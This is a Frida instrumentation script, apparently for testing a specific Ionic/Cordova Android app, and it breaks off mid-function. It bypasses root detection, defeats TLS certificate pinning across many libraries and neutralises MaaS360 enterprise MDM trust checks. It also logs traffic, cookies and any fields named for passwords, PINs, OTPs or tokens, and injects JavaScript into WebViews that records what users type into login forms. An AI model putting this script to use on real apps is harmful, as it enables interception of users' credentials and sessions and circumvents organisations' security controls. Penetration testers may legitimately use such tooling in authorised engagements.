/*
 * Advanced Android SSL Pinning Bypass + Traffic / Credential Capture
 * Authorised testing only.
 *
 * Run:
 *   frida -D 192.168.56.107:5555 -f io.ionic.kscb -l ssl-bypass.js
 *   then type: %resume
 *
 * APK signature bypass (optional):
 *   unzip -p original.apk META-INF/*.RSA > cert.p7b
 *   openssl pkcs7 -inform DER -in cert.p7b -print_certs -out cert.pem
 *   openssl x509 -in cert.pem -outform DER -out cert.der
 *   base64 -w0 cert.der
 *   -> paste into CONFIG.originalCertB64 and set apkSignatureBypass = true
 */
'use strict';

/* ------------------------------------------------------------------ */
/*  Configuration                                                     */
/* ------------------------------------------------------------------ */
const CONFIG = {
  credentialCapture: true,
  httpCapture: true,
  apkSignatureBypass: false,
  originalCertB64: '',

  nativePollMs: 250,
  nativeDurationMs: 120000,
  nativeLibs: [
    'libssl.so',
    'libcrypto.so',
    'libconscrypt_jni.so',
    'libcronet.so',
    'libsscronet.so',
    'libttboringssl.so',
    'libflutter.so',
  ],

  maxLogValue: 500,
};

/* ------------------------------------------------------------------ */
/*  Utilities                                                         */
/* ------------------------------------------------------------------ */
const log = (m) => { try { console.log(m); } catch (_) {} };

function hook(label, fn) {
  try {
    fn();
    log('[+] ' + label);
  } catch (e) {
    log('[-] ' + label + ': ' + e);
  }
}

function clip(value, max) {
  const s = value === null || value === undefined ? String(value) : String(value);
  const limit = max || CONFIG.maxLogValue;
  return s.length > limit ? s.substring(0, limit) + '...' : s;
}

const _seen = Object.create(null);
function once(key, msg) {
  if (!_seen[key]) {
    _seen[key] = 1;
    log(msg);
  }
}

const _throttle = Object.create(null);
function throttled(key, ms, msg) {
  const now = Date.now();
  if (!_throttle[key] || now - _throttle[key] > ms) {
    _throttle[key] = now;
    log(msg);
  }
}

const _registered = Object.create(null);
function registerClassSafe(spec) {
  if (_registered[spec.name]) return _registered[spec.name];

  try {
    const existing = Java.use(spec.name);
    _registered[spec.name] = existing;
    return existing;
  } catch (_) {}

  const C = Java.registerClass(spec);
  _registered[spec.name] = C;
  return C;
}

/* ------------------------------------------------------------------ */
/*  Java layer                                                        */
/* ------------------------------------------------------------------ */
Java.perform(function () {
  log('[*] Java layer starting');

  /* ============ 0. Cordova iroot / RootBeer ============ */
  hook('Cordova iroot bypass', function () {
    try {
      const C = Java.use('o1.c');
      C.j.overload('android.content.Context').implementation = function () {
        log('[+] IRoot internal check -> false');
        return false;
      };
      if (C.k) {
        C.k.overload('android.content.Context').implementation = function () {
          return false;
        };
      }
    } catch (_) {}

    try {
      const B = Java.use('j1.b');
      ['s', 't'].forEach(function (m) {
        if (B[m]) {
          B[m].implementation = function () {
            log('[+] RootBeer.' + m + '() -> false');
            return false;
          };
        }
      });
    } catch (_) {}
  });

  /* ============ 1. TrustManager / SSLContext ============ */
  hook('TrustManager / SSLContext', function () {
    const X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    const TrustAll = registerClassSafe({
      name: 'com.frida.TrustAllManager',
      implements: [X509TrustManager],
      methods: {
        checkClientTrusted: function () {},
        checkServerTrusted: function () {},
        getAcceptedIssuers: function () {
          return Java.array('java.security.cert.X509Certificate', []);
        },
      },
    });
    const trustAll = TrustAll.$new();
    global.__trustAllManager = trustAll;

    let trustAllFactory = null;
    try {
      const SSLContext = Java.use('javax.net.ssl.SSLContext');
      const ctx = SSLContext.getInstance('TLS');
      ctx.init(null, Java.array('javax.net.ssl.TrustManager', [trustAll]), null);
      trustAllFactory = ctx.getSocketFactory();
      global.__trustAllFactory = trustAllFactory;
    } catch (e) {
      log('[-] trust-all SSLContext: ' + e);
    }

    try {
      const X509Ext = Java.use('javax.net.ssl.X509ExtendedTrustManager');
      const certArray = '[Ljava.security.cert.X509Certificate;';
      const noop = function () {};

      const checkClientTrusted = [
        { returnType: 'void', argumentTypes: [certArray, 'java.lang.String'], implementation: noop },
        { returnType: 'void', argumentTypes: [certArray, 'java.lang.String', 'java.net.Socket'], implementation: noop },
        { returnType: 'void', argumentTypes: [certArray, 'java.lang.String', 'javax.net.ssl.SSLEngine'], implementation: noop },
      ];
      const checkServerTrusted = [
        { returnType: 'void', argumentTypes: [certArray, 'java.lang.String'], implementation: noop },
        { returnType: 'void', argumentTypes: [certArray, 'java.lang.String', 'java.net.Socket'], implementation: noop },
        { returnType: 'void', argumentTypes: [certArray, 'java.lang.String', 'javax.net.ssl.SSLEngine'], implementation: noop },
      ];

      const TrustAllExt = registerClassSafe({
        name: 'com.frida.TrustAllExtManager',
        superClass: X509Ext,
        methods: {
          checkClientTrusted: checkClientTrusted,
          checkServerTrusted: checkServerTrusted,
          getAcceptedIssuers: {
            returnType: certArray,
            argumentTypes: [],
            implementation: function () {
              return Java.array('java.security.cert.X509Certificate', []);
            },
          },
        },
      });
      global.__trustAllExtManager = TrustAllExt.$new();
    } catch (e) {
      log('[-] X509ExtendedTrustManager: ' + e);
    }

    const SSLContext = Java.use('javax.net.ssl.SSLContext');
    const init = SSLContext.init.overload(
      '[Ljavax.net.ssl.KeyManager;',
      '[Ljavax.net.ssl.TrustManager;',
      'java.security.SecureRandom'
    );
    init.implementation = function (km, tm, sr) {
      log('[+] SSLContext.init -> trust-all');
      return init.call(
        this,
        km,
        Java.array('javax.net.ssl.TrustManager', [trustAll]),
        sr
      );
    };

    if (trustAllFactory) {
      try {
        const SSLSocketFactory = Java.use('javax.net.ssl.SSLSocketFactory');
        SSLSocketFactory.getDefault.implementation = function () {
          return trustAllFactory;
        };
      } catch (_) {}
    }
  });

  /* ============ 2. OkHttp 2 / 3 / 4 ============ */
  hook('OkHttp3 CertificatePinner', function () {
    const CP = Java.use('okhttp3.CertificatePinner');

    CP.check.overloads.forEach(function (ov) {
      const types = ov.argumentTypes.map(function (t) { return t.className; }).join(',');
      if (types.indexOf('java.lang.String') !== 0) return;
      ov.implementation = function () {
        log('[+] OkHttp3 CertificatePinner.check bypassed: ' + arguments[0]);
      };
    });

    try {
      CP.check$okhttp.overloads.forEach(function (ov) {
        ov.implementation = function () {
          log('[+] OkHttp3 CertificatePinner.check$okhttp bypassed');
        };
      });
    } catch (_) {}
  });

  hook('OkHttp Builder.certificatePinner', function () {
    const Builder = Java.use('okhttp3.OkHttpClient$Builder');
    Builder.certificatePinner.implementation = function () {
      log('[+] OkHttp Builder.certificatePinner neutralised');
      return this;
    };
  });

  hook('OkHttp OkHostnameVerifier', function () {
    [
      'okhttp3.internal.tls.OkHostnameVerifier',
      'com.squareup.okhttp.internal.tls.OkHostnameVerifier',
    ].forEach(function (name) {
      try {
        const HV = Java.use(name);
        HV.verify.overloads.forEach(function (ov) {
          ov.implementation = function () { return true; };
        });
      } catch (_) {}
    });
  });

  hook('OkHttp2 CertificatePinner', function () {
    const CP2 = Java.use('com.squareup.okhttp.CertificatePinner');
    CP2.check.overloads.forEach(function (ov) {
      if (ov.argumentTypes.length !== 2) return;
      ov.implementation = function (host) {
        log('[+] OkHttp2 CertificatePinner.check bypassed: ' + host);
      };
    });
  });

  /* ============ 3. TrustKit ============ */
  [
    'com.datadog.android.trace.internal.net.TrustKitTrustManager',
    'com.datadog.trustkit.TrustKitTrustManager',
    'com.datatheorem.android.trustkit.pinning.TrustKitTrustManager',
  ].forEach(function (cls) {
    try {
      const T = Java.use(cls);
      T.checkServerTrusted.overloads.forEach(function (ov) {
        ov.implementation = function () {};
      });
      log('[+] TrustKit hooked: ' + cls);
    } catch (_) {}
  });

  /* ============ 4. Conscrypt ============ */
  hook('Conscrypt TrustManagerImpl', function () {
    [
      'com.android.org.conscrypt.TrustManagerImpl',
      'org.conscrypt.TrustManagerImpl',
    ].forEach(function (cn) {
      try {
        const TMI = Java.use(cn);

        try {
          TMI.verifyChain.overloads.forEach(function (ov) {
            ov.implementation = function (untrusted) {
              log('[+] Conscrypt verifyChain bypassed');
              return untrusted;
            };
          });
        } catch (_) {}

        try {
          TMI.checkTrusted.overloads.forEach(function (ov) {
            ov.implementation = function () {};
          });
        } catch (_) {}

        try {
          TMI.checkServerTrusted.overloads.forEach(function (ov) {
            ov.implementation = function () {};
          });
        } catch (_) {}

        log('[+] Conscrypt hooked: ' + cn);
      } catch (_) {}
    });

    try {
      const CPM = Java.use('com.android.org.conscrypt.CertPinManager');
      CPM.isChainValid.overloads.forEach(function (ov) {
        ov.implementation = function () { return true; };
      });
    } catch (_) {}
  });

  /* ============ 5. NetworkSecurityPolicy ============ */
  hook('NetworkSecurityPolicy', function () {
    const NSP = Java.use('android.security.NetworkSecurityPolicy');
    if (NSP.isCleartextTrafficPermitted) {
      NSP.isCleartextTrafficPermitted.overloads.forEach(function (ov) {
        ov.implementation = function () { return true; };
      });
    }
  });

  /* ============ 6. HttpsURLConnection / HostnameVerifier ============ */
  hook('HttpsURLConnection / HostnameVerifier', function () {
    const HttpsUC = Java.use('javax.net.ssl.HttpsURLConnection');
    const HV = Java.use('javax.net.ssl.HostnameVerifier');
    const AllowAll = registerClassSafe({
      name: 'com.frida.AllowAllHostnameVerifier',
      implements: [HV],
      methods: {
        verify: function (host) {
          log('[+] HostnameVerifier accepted ' + host);
          return true;
        },
      },
    });
    const allowAll = AllowAll.$new();
    global.__allowAllVerifier = allowAll;
    const factory = global.__trustAllFactory;

    HttpsUC.getDefaultHostnameVerifier.implementation = function () { return allowAll; };
    try {
      HttpsUC.setDefaultHostnameVerifier.call(HttpsUC, allowAll);
    } catch (_) {}

    try {
      HttpsUC.getHostnameVerifier.implementation = function () { return allowAll; };
    } catch (_) {}

    if (factory) {
      try {
        HttpsUC.getDefaultSSLSocketFactory.implementation = function () { return factory; };
        HttpsUC.setDefaultSSLSocketFactory.call(HttpsUC, factory);
        HttpsUC.getSSLSocketFactory.implementation = function () { return factory; };
      } catch (_) {}
    }

    [
      'com.android.okhttp.internal.huc.HttpsURLConnectionImpl',
      'com.android.okhttp.internal.huc.DelegatingHttpsURLConnection',
      'sun.net.www.protocol.https.HttpsURLConnectionImpl',
    ].forEach(function (name) {
      try {
        const Impl = Java.use(name);
        try {
          Impl.getHostnameVerifier.implementation = function () { return allowAll; };
          Impl.setHostnameVerifier.overloads.forEach(function (ov) {
            ov.implementation = function () { return ov.call(this, allowAll); };
          });
        } catch (_) {}
        if (factory) {
          try {
            Impl.getSSLSocketFactory.implementation = function () { return factory; };
            Impl.setSSLSocketFactory.overloads.forEach(function (ov) {
              ov.implementation = function () { return ov.call(this, factory); };
            });
          } catch (_) {}
        }
      } catch (_) {}
    });
  });

  /* ============ 6b. Ionic / Capacitor SSL pinning plugin ============ */
  hook('Ionic SSLPinning plugin', function () {
    const Plugin = Java.use('io.ionic.sslpinning.SSLPinning');
    const factory = global.__trustAllFactory;

    try {
      Plugin.isDomainExcluded.overloads.forEach(function (ov) {
        ov.implementation = function () { return true; };
      });
    } catch (_) {}

    if (factory) {
      try {
        Plugin.getSSLSocketFactory.overloads.forEach(function (ov) {
          ov.implementation = function () { return factory; };
        });
      } catch (_) {}
    }
  });

  /* ============ 6c. Cordova advanced-http (silkimen) ============ */
  hook('Cordova advanced-http SSL config', function () {
    const factory = global.__trustAllFactory;
    const allowAll = global.__allowAllVerifier;

    try {
      const Cfg = Java.use('m1.e');
      if (allowAll) {
        Cfg.a.implementation = function () { return allowAll; };
      }
      if (factory) {
        Cfg.b.implementation = function () { return factory; };
      }
    } catch (_) {}

    try {
      const Req = Java.use('l1.b');
      Req.b.overloads.forEach(function (ov) {
        ov.implementation = function () {
          const result = ov.call(this, ...arguments);
          try {
            const req = arguments[0];
            if (req && factory && req.c0) req.c0(factory);
            if (req && allowAll && req.b0) req.b0(allowAll);
          } catch (_) {}
          return result;
        };
      });
    } catch (_) {}
  });

  /* ============ 6d. Cordova advanced-http traffic ============ */
  hook('Cordova advanced-http traffic', function () {
    try {
      const P = Java.use('com.silkimen.cordovahttp.CordovaHttpPlugin');
      const post = P.d;
      post.implementation = function (method, args, callback) {
        try {
          const url = String(args.getString(0));
          const body = args.get(1);
          const headers = args.getJSONObject(3);
          log('[CORDOVA-REQ] ' + method + ' ' + url);
          if (body) {
            log('  [CORDOVA-BODY] ' + clip(String(body), 3000));
            try {
              if (body.getClass().getName() === 'org.json.JSONObject') {
                const keys = body.keys();
                while (keys.hasNext()) {
                  const k = String(keys.next());
                  if (/user|email|login|pass|pwd|pin|otp|secret|token/i.test(k)) {
                    log('  [CORDOVA-CRED] ' + k + ' = ' + clip(String(body.get(k)), 800));
                  }
                }
              }
            } catch (_) {}
          }
          if (headers) log('  [CORDOVA-HDR] ' + clip(headers.toString(), 1200));
        } catch (_) {}
        return post.call(this, method, args, callback);
      };
      const get = P.e;
      get.implementation = function (method, args, callback) {
        try { log('[CORDOVA-REQ] ' + method + ' ' + String(args.getString(0))); } catch (_) {}
        return get.call(this, method, args, callback);
      };
    } catch (_) {}

    const B = Java.use('l1.b');
    const run = B.run;
    run.implementation = function () {
      try {
        const url = String(this.f2825b.value || '');
        const method = String(this.f2824a.value || '');
        const serializer = String(this.f2826c.value || '');
        const headers = this.f2829f.value;
        const body = this.f2828e.value;
        log('[HTTP-REQ] ' + method + ' ' + url + ' [' + serializer + ']');
        if (headers) log('  [HTTP-HDR] ' + clip(headers.toString(), 1200));
        if (body) {
          const bodyClass = body.getClass().getName();
          let bodyText = '';
          if (bodyClass === '[B') {
            bodyText = '[bytes ' + body.length + '] ' + Java.use('android.util.Base64').encodeToString(body, 0);
          } else {
            bodyText = String(body.toString());
          }
          log('  [HTTP-BODY] ' + clip(bodyText, 3000));
          if (bodyClass === 'org.json.JSONObject') {
            try {
              const keys = body.keys();
              while (keys.hasNext()) {
                const k = String(keys.next());
                if (/user|email|login|pass|pwd|pin|otp|secret|token/i.test(k)) {
                  log('  [HTTP-CRED] ' + k + ' = ' + clip(String(body.get(k)), 800));
                }
              }
            } catch (_) {}
          }
        }
      } catch (_) {}
      return run.call(this);
    };

    try {
      const E = Java.use('l1.e');
      const j = E.j;
      j.implementation = function () {
        const result = j.call(this);
        try { log('[HTTP-RESP] ' + clip(result.toString(), 3000)); } catch (_) {}
        return result;
      };
    } catch (_) {}

    try {
      const G = Java.use('l1.g');
      const success = G.f;
      success.implementation = function (obj) {
        try { log('[HTTP-SUCCESS] ' + clip(String(obj), 3000)); } catch (_) {}
        return success.call(this, obj);
      };
      const error = G.a;
      error.implementation = function (obj) {
        try { log('[HTTP-ERROR] ' + clip(String(obj), 3000)); } catch (_) {}
        return error.call(this, obj);
      };
    } catch (_) {}
  });

  /* ============ 7. WebView SSL ============ */
  hook('WebView SslErrorHandler', function () {
    const SEH = Java.use('android.webkit.SslErrorHandler');

    const proceed = SEH.proceed;
    proceed.implementation = function () {
      log('[+] SslErrorHandler.proceed()');
      return proceed.call(this);
    };

    const cancel = SEH.cancel;
    cancel.implementation = function () {
      log('[+] SslErrorHandler.cancel() -> proceed()');
      return proceed.call(this);
    };

    try {
      const WVC = Java.use('android.webkit.WebViewClient');
      WVC.onReceivedSslError.implementation = function (view, handler, error) {
        log('[+] WebViewClient.onReceivedSslError ignored');
        try { handler.proceed(); } catch (_) {}
      };
    } catch (_) {}
  });

  /* ============ 8. WebView traffic / forms / cookies ============ */
  (function webview() {
    const WEB_HOOK_JS = `(function () {
      if (window.__fridaHooksInstalled) return;
      window.__fridaHooksInstalled = true;
      var MAX = 2000;
      function emit(tag, obj) {
        try { console.log(tag + JSON.stringify(obj)); } catch (e) {}
      }
      function capture(el, ev) {
        try {
          if (!el || !el.tagName) return;
          var tag = el.tagName.toLowerCase();
          if (tag !== 'input' && tag !== 'textarea') return;
          var type = (el.type || tag).toLowerCase();
          var value = el.value;
          if (value === undefined || value === null || value === '') return;
          var hint = (el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' +
            (el.getAttribute ? (el.getAttribute('formcontrolname') || el.getAttribute('aria-label') || '') : '');
          var isPwd = type === 'password' || new RegExp('pass|pwd|pin|otp|secret|token', 'i').test(hint);
          var isUser = type === 'email' || type === 'text' || type === 'tel' || type === 'number' ||
            new RegExp('user|email|login|account|phone|mobile|name', 'i').test(hint);
          if (!isPwd && !isUser) return;
          emit('__FRIDA_CRED__', {
            kind: isPwd ? 'password' : 'username',
            event: ev || '',
            tag: tag,
            type: type,
            name: el.name || '',
            id: el.id || '',
            placeholder: el.placeholder || '',
            hint: hint,
            value: String(value).substring(0, MAX)
          });
        } catch (e) {}
      }
      function eventInput(e) {
        try {
          var path = e && e.composedPath ? e.composedPath() : null;
          if (path) {
            for (var i = 0; i < path.length; i++) {
              var n = path[i];
              if (n && n.tagName) {
                var t = n.tagName.toLowerCase();
                if (t === 'input' || t === 'textarea') return n;
              }
            }
          }
        } catch (e2) {}
        return e ? e.target : null;
      }
      function collect(root, out) {
        try {
          if (!root || !root.querySelectorAll) return;
          var list = root.querySelectorAll('input,textarea');
          for (var i = 0; i < list.length; i++) out.push(list[i]);
          var all = root.querySelectorAll('*');
          for (var j = 0; j < all.length; j++) {
            try { if (all[j].shadowRoot) collect(all[j].shadowRoot, out); } catch (e) {}
          }
        } catch (e) {}
      }
      function scan(ev) {
        try {
          var list = [];
          collect(document, list);
          for (var i = 0; i < list.length; i++) capture(list[i], ev);
        } catch (e) {}
      }
      document.addEventListener('input', function (e) { capture(eventInput(e), 'input'); }, true);
      document.addEventListener('change', function (e) { capture(eventInput(e), 'change'); }, true);
      document.addEventListener('submit', function (e) { scan('submit'); }, true);
      document.addEventListener('click', function (e) {
        var t = e.target;
        var text = t ? ((t.innerText || '') + ' ' + (t.value || '') + ' ' + (t.id || '')) : '';
        if (new RegExp('login|sign.?in|submit|continue|next', 'i').test(text)) scan('click');
      }, true);
      function init() {
        scan('init');
        setTimeout(function () { scan('init2'); }, 1500);
        setTimeout(function () { scan('init3'); }, 4000);
      }
      if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
      else init();

      function logFetch(url, method, headers, body) {
        emit('__FRIDA_HTTP__', {
          evt: 'req',
          url: String(url || '').substring(0, MAX),
          method: String(method || 'GET'),
          headers: headers || {},
          body: body ? String(body).substring(0, MAX) : ''
        });
      }
      function logResp(url, status, body) {
        emit('__FRIDA_HTTP__', {
          evt: 'resp',
          url: String(url || '').substring(0, MAX),
          status: status,
          body: body ? String(body).substring(0, MAX) : ''
        });
      }

      var origFetch = window.fetch;
      if (origFetch) {
        window.fetch = function (input, init) {
          try {
            var url = typeof input === 'string' ? input : (input && input.url) || '';
            var method = (init && init.method) || (input && input.method) || 'GET';
            var headers = {};
            try {
              var h = (init && init.headers) || (input && input.headers);
              if (h) {
                if (typeof h.forEach === 'function') h.forEach(function (v, k) { headers[k] = v; });
                else if (Array.isArray(h)) h.forEach(function (p) { headers[p[0]] = p[1]; });
                else Object.keys(h).forEach(function (k) { headers[k] = h[k]; });
              }
            } catch (e) {}
            logFetch(url, method, headers, init && init.body);
          } catch (e) {}
          return origFetch.apply(this, arguments).then(function (resp) {
            try {
              var clone = resp.clone();
              clone.text().then(function (txt) { logResp(resp.url, resp.status, txt); }).catch(function () {});
            } catch (e) {}
            return resp;
          });
        };
      }

      try {
        var XHR = window.XMLHttpRequest;
        if (XHR && XHR.prototype) {
          var origOpen = XHR.prototype.open;
          var origSend = XHR.prototype.send;
          var origSetHeader = XHR.prototype.setRequestHeader;
          XHR.prototype.open = function (method, url) {
            try { this.__fridaHttp = { method: method, url: url, headers: {} }; } catch (e) {}
            return origOpen.apply(this, arguments);
          };
          XHR.prototype.setRequestHeader = function (k, v) {
            try { if (this.__fridaHttp) this.__fridaHttp.headers[k] = v; } catch (e) {}
            return origSetHeader.apply(this, arguments);
          };
          XHR.prototype.send = function (body) {
            var xhr = this;
            try {
              var info = xhr.__fridaHttp || {};
              logFetch(info.url, info.method, info.headers, body);
            } catch (e) {}
            try {
              xhr.addEventListener('load', function () {
                try {
                  var info = xhr.__fridaHttp || {};
                  logResp(info.url, xhr.status, xhr.responseText);
                } catch (e) {}
              });
            } catch (e) {}
            return origSend.apply(this, arguments);
          };
        }
      } catch (e) {}
    })();`;

    function injectWebView(wv) {
      try {
        if (wv && wv.evaluateJavascript) {
          wv.evaluateJavascript(WEB_HOOK_JS, null);
          once('wv-js', '[+] WebView JS credential/HTTP hooks injected');
        }
      } catch (_) {}
    }

    function injectWebViewLater(wv, ms) {
      setTimeout(function () {
        try {
          Java.scheduleOnMainThread(function () { injectWebView(wv); });
        } catch (_) {
          injectWebView(wv);
        }
      }, ms);
    }

    function handleConsoleMessage(msg) {
      try {
        const s = String(msg || '');
        if (s.indexOf('__FRIDA_CRED__') === 0) {
          throttled('webcred-' + s, 300, '[WEB-CRED] ' + clip(s.substring(14), 1500));
        } else if (s.indexOf('__FRIDA_HTTP__') === 0) {
          throttled('webhttp-' + s, 300, '[WEB-HTTP] ' + clip(s.substring(14), 3000));
        }
      } catch (_) {}
    }

    try {
      const WVC = Java.use('android.webkit.WebViewClient');

      WVC.shouldInterceptRequest.overloads.forEach(function (ov) {
        ov.implementation = function () {
          try {
            const req = arguments[1];
            if (req && req.getUrl) {
              log('[WV-REQ] ' + req.getMethod() + ' ' + req.getUrl().toString());
              const h = req.getRequestHeaders();
              if (h) {
                h.keySet().toArray().forEach(function (k) {
                  const v = h.get(k);
                  if (/auth|cookie|token|pass|user|session/i.test(k) || (v && v.length < 200)) {
                    log('  [WV-HDR] ' + k + ': ' + v);
                  }
                });
              }
            } else if (arguments[1]) {
              log('[WV-REQ] ' + arguments[1]);
            }
          } catch (_) {}
          return ov.call(this, ...arguments);
        };
      });
    } catch (_) {}

    try {
      const WV = Java.use('android.webkit.WebView');

      WV.loadUrl.overloads.forEach(function (ov) {
        ov.implementation = function (url) {
          log('[WV-URL] ' + url);
          const result = ov.call(this, ...arguments);
          const wv = this;
          injectWebView(wv);
          injectWebViewLater(wv, 1500);
          return result;
        };
      });

      const postUrl = WV.postUrl.overload('java.lang.String', '[B');
      postUrl.implementation = function (url, data) {
        log('[WV-POST] ' + url);
        try {
          if (data) {
            let s = '';
            for (let i = 0; i < data.length; i++) s += String.fromCharCode(data[i] & 0xff);
            log('  [WV-POST-BODY] ' + clip(s));
          }
        } catch (_) {}
        const result = postUrl.call(this, url, data);
        const wv = this;
        injectWebView(wv);
        injectWebViewLater(wv, 1500);
        return result;
      };
    } catch (_) {}

    try {
      const JPR = Java.use('android.webkit.JsPromptResult');
      const confirm = JPR.confirm;
      confirm.implementation = function (s) {
        log('[WV-JS-PROMPT] ' + clip(s));
        return confirm.call(this, s);
      };
    } catch (_) {}

    try {
      const BWC = Java.use('com.getcapacitor.BridgeWebViewClient');
      const onFinished = BWC.onPageFinished.overload('android.webkit.WebView', 'java.lang.String');
      onFinished.implementation = function (wv, url) {
        const result = onFinished.call(this, wv, url);
        injectWebView(wv);
        return result;
      };
    } catch (_) {}

    try {
      const WVC = Java.use('android.webkit.WebViewClient');
      WVC.onPageFinished.overloads.forEach(function (ov) {
        ov.implementation = function () {
          const result = ov.call(this, ...arguments);
          try { injectWebView(arguments[0]); } catch (_) {}
          return result;
        };
      });
    } catch (_) {}

    try {
      const BWCC = Java.use('com.getcapacitor.BridgeWebChromeClient');
      const onConsole = BWCC.onConsoleMessage.overload('android.webkit.ConsoleMessage');
      onConsole.implementation = function (msg) {
        try { handleConsoleMessage(msg.message()); } catch (_) {}
        return onConsole.call(this, msg);
      };
    } catch (_) {}

    try {
      const WC = Java.use('android.webkit.WebChromeClient');
      if (WC.onConsoleMessage) {
        WC.onConsoleMessage.overloads.forEach(function (ov) {
          ov.implementation = function () {
            try {
              const first = arguments[0];
              handleConsoleMessage(first && first.message ? first.message() : first);
            } catch (_) {}
            return ov.call(this, ...arguments);
          };
        });
      }
    } catch (_) {}

    try {
      const CM = Java.use('android.webkit.CookieManager');
      CM.setCookie.overloads.forEach(function (ov) {
        ov.implementation = function (url, cookie) {
          log('[COOKIE] ' + url + ' -> ' + clip(cookie, 800));
          return ov.call(this, ...arguments);
        };
      });
      CM.getCookie.overloads.forEach(function (ov) {
        ov.implementation = function (url) {
          const r = ov.call(this, ...arguments);
          if (r) log('[COOKIE-GET] ' + url + ' -> ' + clip(r, 800));
          return r;
        };
      });
    } catch (_) {}
  })();

  /* ============ 9. MaaS360 ============ */
  (function maas360() {
    function hookGateway() {
      try {
        const GW = Java.use('com.fiberlink.maas360sdk.ipc.service.MaaS360GatewayClearSSLTrustedList');
        GW.executeRemoteMethod.overloads.forEach(function (ov) {
          ov.implementation = function () {
            log('[+] MaaS360 gateway.executeRemoteMethod no-op');
          };
        });
        once('maas-gw', '[+] MaaS360 gateway hooked');
      } catch (_) {}
    }

    hookGateway();

    try {
      const names = Java.enumerateLoadedClassesSync();
      for (let i = 0; i < names.length; i++) {
        const name = names[i];
        if (name.indexOf('maas360') === -1) continue;
        if (name.indexOf('MaaS360GatewayClearSSLTrustedList') !== -1) hookGateway();
        try {
          const Cls = Java.use(name);
          if (Cls.class.isInterface()) continue;
          try {
            Cls.clearSslTrustedList.overloads.forEach(function (ov) {
              ov.implementation = function () {
                log('[+] ' + name + '.clearSslTrustedList no-op');
              };
            });
          } catch (_) {}
        } catch (_) {}
      }
    } catch (_) {}

    try {
      const Ctx = Java.use('com.fiberlink.maas360sdk.core.MaaS360SDKContextWrapper');
      const methods = [
        'addSslTrustedCertificate', 'addSslTrustedCertificates',
        'clearSslTrustedList', 'isSslTrusted', 'isCertificateTrusted',
        'checkSslTrust', 'verifySslTrust', 'getSslTrustedList',
        'validateSslPinning', 'checkPinnedCert', 'verifyPinnedCertificate',
      ];
      methods.forEach(function (m) {
        try {
          Ctx[m].overloads.forEach(function (ov) {
            ov.implementation = function () {
              log('[+] MaaS360ContextWrapper.' + m + '() bypassed');
              if (/^(is|check|verify|validate)/.test(m)) return true;
              if (m === 'getSslTrustedList') return Java.use('java.util.ArrayList').$new();
            };
          });
        } catch (_) {}
      });
    } catch (_) {}
  })();

  /* ============ 9b. MaaS360 agent certificate pinning ============ */
  (function maas360Agent() {
    const hooked = {};

    function interestingClass(name) {
      return name.indexOf('com.fiberlink.maas360') !== -1 &&
        /pin|cert|trust|ssl|tls/i.test(name);
    }

    function hookClass(name) {
      if (hooked[name]) return;
      hooked[name] = true;

      try {
        const Cls = Java.use(name);
        if (Cls.class.isInterface()) return;

        const declared = Cls.class.getDeclaredMethods();
        for (let i = 0; i < declared.length; i++) {
          const method = declared[i];
          const methodName = method.getName();
          if (!/pin|trust|verify|validate/i.test(methodName)) continue;

          const returnType = method.getReturnType().getName();
          if (returnType !== 'boolean' && returnType !== 'void') continue;

          const key = name + '#' + methodName;
          if (hooked[key]) continue;
          hooked[key] = true;

          try {
            Cls[methodName].overloads.forEach(function (ov) {
              ov.implementation = function () {
                log('[+] MaaS360 agent ' + name + '.' + methodName + '() bypassed');
                if (returnType === 'boolean') return true;
              };
            });
          } catch (_) {}
        }
      } catch (_) {}
    }

    function scan() {
      try {
        const classes = Java.enumerateLoadedClassesSync();
        for (let i = 0; i < classes.length; i++) {
          if (interestingClass(classes[i])) hookClass(classes[i]);
        }
      } catch (_) {}
    }

    scan();
    let rounds = 0;
    const timer = setInterval(function () {
      scan();
      if (++rounds >= 20) clearInterval(timer);
    }, 5000);
  })();

  /* ============ 9c. Digest comparison bypass ============ */
  hook('MessageDigest.isEqual', function () {
    const MD = Java.use('java.security.MessageDigest');
    const isEqual = MD.isEqual.overload('[B', '[B');

    isEqual.implementation = function (a, b) {
      try {
        const Throwable = Java.use('java.lang.Throwable');
        const Log = Java.use('android.util.Log');
        const stack = Log.getStackTraceString(Throwable.$new());
        if (/maas360|fiberlink|pinn|cert|trust/i.test(stack)) {
          log('[+] MessageDigest.isEqual -> true (pinning stack)');
          return true;
        }
      } catch (_) {}
      return isEqual.call(this, a, b);
    };
  });

  /* ============ 10. TWA / Custom Tabs ============ */
  (function twa() {
    [
      'androidx.browser.trusted.TrustedWebActivityServiceConnection',
      'android.support.customtabs.trusted.TrustedWebActivityServiceConnection',
    ].forEach(function (cls) {
      try {
        const C = Java.use(cls);

        try {
          C.sendExtraCommand.overloads.forEach(function (ov) {
            ov.implementation = function (cmd, bundle) {
              log('[TWA] sendExtraCommand cmd="' + cmd + '"');
              try {
                if (bundle) {
                  bundle.keySet().toArray().forEach(function (k) {
                    log('  [TWA-ARG] ' + k + ' = ' + clip(bundle.get(k), 300));
                  });
                }
              } catch (_) {}
              return ov.call(this, ...arguments);
            };
          });
        } catch (_) {}

        try {
          C.notify.overloads.forEach(function (ov) {
            ov.implementation = function (tag, id) {
              log('[TWA] notify tag=' + tag + ' id=' + id);
              return ov.call(this, ...arguments);
            };
          });
        } catch (_) {}

        try {
          C.getActiveNotifications.overloads.forEach(function (ov) {
            ov.implementation = function () {
              const arr = ov.call(this, ...arguments);
              try {
                if (arr) {
                  for (let i = 0; i < arr.length; i++) {
                    log('[TWA-NOTIF] ' + arr[i].toString());
                  }
                }
              } catch (_) {}
              return arr;
            };
          });
        } catch (_) {}

        log('[+] TWA ServiceConnection hooked (' + cls + ')');
      } catch (_) {}
    });

    [
      'androidx.browser.trusted.TrustedWebActivityCallback',
      'android.support.customtabs.trusted.ITrustedWebActivityCallback$Stub',
      'android.support.customtabs.trusted.ITrustedWebActivityCallback$Stub$Proxy',
    ].forEach(function (cls) {
      try {
        const C = Java.use(cls);
        C.onExtraCallback.overloads.forEach(function (ov) {
          ov.implementation = function (name, bundle) {
            log('[TWA-CB] ' + name);
            try {
              if (bundle) {
                bundle.keySet().toArray().forEach(function (k) {
                  log('  [TWA-CB] ' + k + ' = ' + clip(bundle.get(k), 300));
                });
              }
            } catch (_) {}
            return ov.call(this, ...arguments);
          };
        });
      } catch (_) {}
    });

    try {
      const Svc = Java.use('androidx.browser.trusted.TrustedWebActivityService');
      Svc.onExtraCommand.overloads.forEach(function (ov) {
